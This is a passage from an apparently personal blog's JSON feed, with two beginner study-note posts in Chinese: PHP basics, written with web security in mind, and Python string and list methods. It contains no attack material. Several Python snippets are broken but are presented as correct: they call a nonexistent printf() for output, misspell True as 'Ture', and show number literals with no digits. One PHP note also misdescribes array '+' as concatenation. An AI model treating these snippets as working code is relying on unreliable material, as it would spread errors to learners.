            "content_html": "<p>为了读懂 web 一些漏洞和原理，浅显学习了一下 php 语言，并做了一点简陋的笔记，方便回顾。</p>\n<p>后面还会不断的或是专业的学习这门语言。</p>\n<p><span id=\"more\"></span></p>\n<p>1. 变量以 $ 符号开始，不能包含空格，区分大小写。php 定义变量，不用声明变量类型。</p>\n<p>2. 以 <code>?php</code>  开始，以 <code>?&gt;</code>  结尾。</p>\n<p>3. 在函数内调用全局变量，要用  <code>global</code>  关键字，比如：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$x</span> <span class=\"token operator\">=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$y</span> <span class=\"token operator\">=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">text</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">global</span> <span class=\"token variable\">$x</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$y</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$x</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$x</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$y</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>当然，也可这么引用：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'x'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'x'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'y'</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>4. <code>static</code>  作用域，用法语 c 语言差不多，让一个变量的值不会被清除或重置。</p>\n<p>5.echo 和 print 的区别：</p>\n<ul>\n<li><code>echo</code>  - 可以输出一个或多个字符串，没有返回值，速度比 print 要快。</li>\n<li><code>print</code>  - 只允许输出一个字符串，返回值总为 1</li>\n</ul>\n<p>6. 类型比较， <code>==</code>  只比较值，不比较类型； <code>===</code>  既比较值也比较类型</p>\n<p>7. 定义常量时 可选择是否区分大小写区分，不区分则在后面加 <code>true</code> ，例如：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">define</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"value\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>8. 并置运算符 (.)，例如</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$txt1</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\" \"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$txt2</span> <span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>9. 整除运算符 <code> intdiv()</code>  ，该函数返回值为第一个参数除以第二个参数的值并向下取整数，例如 <code>intdiv(10,3)</code>   值为 3</p>\n<p>10. 赋值运算符中    <code>a .= b</code> , 相当于  <code>a = a . b</code>  , 连接两个字符串。</p>\n<p>11. 比较运算符中   <code>x &lt;&gt; y</code>  相当于  <code>x != y</code>  ， <code>x!==y</code>  会同时判断值和类型。</p>\n<p>12. 数组运算符中， <code>x + y</code>  能拼接两个数组。</p>\n<p>13. 组合比较符 <code>&lt;=&gt;</code> ，用法：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$a</span> <span class=\"token operator\">&lt;=></span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>if $a &gt; $b, $c = 1;</p>\n<p>if $a &lt; $b, $c = -1;</p>\n<p>if $a = $b, $c = 0;</p>\n<p>14. 数组，可以储存字符串，用 <strong>array()</strong> 函数创建。</p>\n<p>关联数组，可以通过一个数组关联到另外的数组。</p>\n<p>部分有关数组的函数：</p>\n<ul>\n<li>sort () - 对数组进行升序排列</li>\n<li>rsort () - 对数组进行降序排列</li>\n<li>asort () - 根据关联数组的键值，对数组进行升序排列</li>\n<li>ksort () - 根据关联数组的键名，对数组进行升序排列</li>\n<li>arsort () - 根据关联数组的键值，对数组进行降序排列</li>\n<li>krsort () - 根据关联数组的键名，对数组进行降序排列</li>\n<li>count () - 用于返回数组元素的数量。</li>\n</ul>\n<p>15.foreach 循环，用于遍历数组。例如：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$x</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Google\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"Runoob\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"Taobao\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$value</span> <span class=\"token operator\">.</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token delimiter important\">?></span></pre></td></tr></table></figure><p>16. 常用函数</p>\n<p>创建一个函数用   <code>function xxx()</code></p>\n<p><strong>strpos()</strong>  用于在字符串内查找一个字符或一段指定的文本。</p>\n<p>如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果 未找到匹配，则返回 FALSE。</p>\n<p>17.php 魔术常量</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token constant\">__LINE__</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token comment\">#报行号</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token constant\">__FILE__</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">#报文件路径和文件名</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token constant\">__DIR__</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token comment\">#报文件所在目录</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token constant\">__FUNCTION__</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token comment\">#返回函数名</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token constant\">__CLASS__</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token comment\">#返回类名</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token constant\">__TRAIT__</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token comment\">#trait 名</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token constant\">__METHOD__</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token comment\">#类的方法名，返回该方法被定义时的名字</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token constant\">__NAMESPACE__</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token comment\">#当前命名空间的名称</span></pre></td></tr></table></figure><p>18.php 命名空间（namespace）</p>\n<p>PHP 命名空间可以解决以下两类问题：</p>\n<p>1. 用户编写的代码与 PHP 内部的类 / 函数 / 常量或第三方类 / 函数 / 常量之间的名字冲突。<br>\n2. 为很长的标识符名称 (通常是为了缓解第一类问题而定义的) 创建一个别名（或简短）的名称，提高源代码的可读性。</p>\n<p>注意：</p>\n<p>在声明命名空间之前唯一合法的代码是用于定义源文件编码方式的 declare 语句。所有非 PHP 代码包括空白符都不能出现在命名空间的声明之前。</p>\n<hr>\n<p>上面的知识点摘录于<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9waHAvcGhwLXR1dG9yaWFsLmh0bWw=\">菜鸟教程 php</span>，更详细。</p>\n",
            "tags": [
                "php"
            ]
        },
        {
            "id": "http://example.com/2021/06/29/python%E4%B8%AD%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86%E7%82%B9/",
            "url": "http://example.com/2021/06/29/python%E4%B8%AD%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86%E7%82%B9/",
            "title": "python学习中部分易忘知识点",
            "date_published": "2021-06-29T10:41:39.545Z",
            "content_html": "<p>本文是我在 py 学习中总结梳理了一些常用的易忘的知识点，为方便回顾和复习，遂加以记录。</p>\n<p>本文我会不断的学习并总结。</p>\n<p><span id=\"more\"></span></p>\n<hr>\n<h2 id=\"1不希望出现转义字符起作用在printf中加rr\"><a class=\"anchor\" href=\"#1不希望出现转义字符起作用在printf中加rr\">#</a> 1. 不希望出现转义字符起作用，在 printf () 中加 r/R</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>printf <span class=\"token punctuation\">(</span>r <span class=\"token string\">'hello\\n world'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#但要注意，最后一个字符不能是 \\</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>printf <span class=\"token punctuation\">(</span>r 'hello\\n world\\'<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#上面的写法是错的</span></pre></td></tr></table></figure><hr>\n<h2 id=\"2将数据输出到文件中去\"><a class=\"anchor\" href=\"#2将数据输出到文件中去\">#</a> 2. 将数据输出到文件中去</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>fp <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span> <span class=\"token punctuation\">(</span> <span class=\"token string\">'D:/text.txt'</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a+'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>printf <span class=\"token punctuation\">(</span><span class=\"token string\">'hello world'</span> <span class=\"token punctuation\">,</span> <span class=\"token builtin\">file</span> <span class=\"token operator\">=</span> fp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>fp<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><hr>\n<h2 id=\"3相比于c语言多的常用数据类型\"><a class=\"anchor\" href=\"#3相比于c语言多的常用数据类型\">#</a> 3. 相比于 c 语言，多的常用数据类型</h2>\n<p>布尔类型 ——bool (Ture , False)</p>\n<p>字符串类型 ——str (与 c 字符串类似)</p>\n<p>整数类型中：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>printf<span class=\"token punctuation\">(</span><span class=\"token string\">'十进制'</span> <span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span>  <span class=\"token comment\">#不用加开头</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>printf <span class=\"token punctuation\">(</span><span class=\"token string\">'二进制'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0b</span> <span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 要加开头</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>printf <span class=\"token punctuation\">(</span><span class=\"token string\">'八进制'</span> <span class=\"token punctuation\">,</span> 0o <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>printf <span class=\"token punctuation\">(</span><span class=\"token string\">'十六进制'</span> <span class=\"token punctuation\">,</span> 0x <span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>浮点数计算中可能出现不精确的情况，另行解决。</p>\n<p>字符串在多换行显示用 ‘’‘xxx’‘’   or   “”“xxx”“”</p>\n<hr>\n<h2 id=\"4print注意\"><a class=\"anchor\" href=\"#4print注意\">#</a> 4.print 注意</h2>\n<p>在一句 printf () 里，不能同时出现多种数据类型，但可以用 str () /int () /  float ()</p>\n<hr>\n<h2 id=\"5计算和定义注意\"><a class=\"anchor\" href=\"#5计算和定义注意\">#</a> 5. 计算和定义注意</h2>\n<p>在 py3 里</p>\n<p>** 表示乘方</p>\n<p>// 表示整除</p>\n<p>数字很大时，可以用下划线来分隔，更清晰易读，py 不会打印下划线</p>\n<p>相比于 c 语言，py 可以这样赋值： x, y, z = 0, 0, 0</p>\n<p>常量一般用全大写表示</p>\n<hr>\n<h2 id=\"6总结一些常用的方法后面遇到的也写到这里了\"><a class=\"anchor\" href=\"#6总结一些常用的方法后面遇到的也写到这里了\">#</a> 6. 总结一些常用的方法（后面遇到的也写到这里了）</h2>\n<p><strong>title()</strong>\t以首字母大写的方式显示每个单词</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>name <span class=\"token operator\">=</span> <span class=\"token string\">\"ada lovelace\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">.</span>title<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Ada Lovelace</pre></td></tr></table></figure><p><strong>upper()</strong>\t全大写字母显示单词</p>\n<p><strong>lower()</strong>\t全小写字母显示单词</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>name <span class=\"token operator\">=</span> <span class=\"token string\">\"ada lovelace\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">.</span>upper<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>ADA LOVELACE</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>ada lovelace</pre></td></tr></table></figure><p><strong>format()</strong>\t这个方法在 3.6 以后的版本已经换为用  f 字符  连接字符串了（所以只写了 f 字符的用法）</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>first_name <span class=\"token operator\">=</span> <span class=\"token string\">\"ada\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>last_name <span class=\"token operator\">=</span> <span class=\"token string\">\"lovelace\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>full_name <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>first_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>last_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Hello, </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>full_name<span class=\"token punctuation\">.</span>title<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">!\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Hello<span class=\"token punctuation\">,</span> Ada Lovelace</pre></td></tr></table></figure><p><strong>rstrip()</strong>\t删除末尾空白</p>\n<p><strong>lstrip()</strong>\t删除开头空白</p>\n<p><strong>strip()</strong>\t 删除字符串两边的空白</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>language_1 <span class=\"token operator\">=</span> <span class=\"token string\">\"python \"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>language_2 <span class=\"token operator\">=</span> <span class=\"token string\">\" python\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>language_1 <span class=\"token operator\">=</span> language_1<span class=\"token punctuation\">.</span>rstrip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>language_2 <span class=\"token operator\">=</span> language_2<span class=\"token punctuation\">.</span>lstrip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>language_1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>language_2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>python</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>python</pre></td></tr></table></figure><p><strong>append()</strong>\t在列表末尾添加元素</p>\n<p><strong>insert()</strong>\t\t在列表的任何位置添加元素</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>phones <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'apple'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'huawei'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'oppo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'vivo'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>phones<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token string\">'honor'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>phones<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\t<span class=\"token comment\">#换行</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>phones <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'apple'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'huawei'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'oppo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'vivo'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>phones<span class=\"token punctuation\">.</span>insert<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token string\">'honor'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>phones<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'apple'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'huawei'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'oppo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'vivo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'honor'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'honor'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'apple'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'huawei'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'oppo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'vivo'</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p><strong>del 语句</strong>\t删除元素，需要知道元素的位置</p>\n<p><strong>pop()</strong>\t\t当需要删除值并接着使用时，用 pop，否则可以用 del 语句删除</p>\n<p><strong>remove()</strong>\t\t根据值删除元素</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>phones <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'apple'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'huawei'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'oppo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'vivo'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">del</span> phones<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>phones<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\t<span class=\"token comment\">#换行</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>phones <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'apple'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'huawei'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'oppo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'vivo'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>buy <span class=\"token operator\">=</span> phones<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>phones<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"I will buy </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>buy<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> phone.\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>phones <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'apple'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'huawei'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'oppo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'vivo'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>phones<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span><span class=\"token string\">'apple'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>phones<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">#remove 有 pop 一样的用法，可以在删除时调用。</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">#remove 只删除第一次出现的值，如果有多个一样的都需要删除，需要用 while 循环。</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'huawei'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'oppo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'vivo'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'apple'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'oppo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'vivo'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>I will buy huawei phone<span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'huawei'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'oppo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'vivo'</span><span class=\"token punctuation\">]</span>`</pre></td></tr></table></figure><hr>\n<h2 id=\"7列表相关方法在6\"><a class=\"anchor\" href=\"#7列表相关方法在6\">#</a> 7. 列表（相关方法在 6）</h2>\n<p>普通列表及访问</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>phones <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'apple'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'huawei'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'oppo'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'vivo'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>phones<span class=\"token punctuation\">)</span>\t\t<span class=\"token comment\">#全部打印</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>phones<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\t\t<span class=\"token comment\">#单个打印</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>phones<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\t<span class=\"token comment\">#索引 - 1 可以访问最后一个</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td 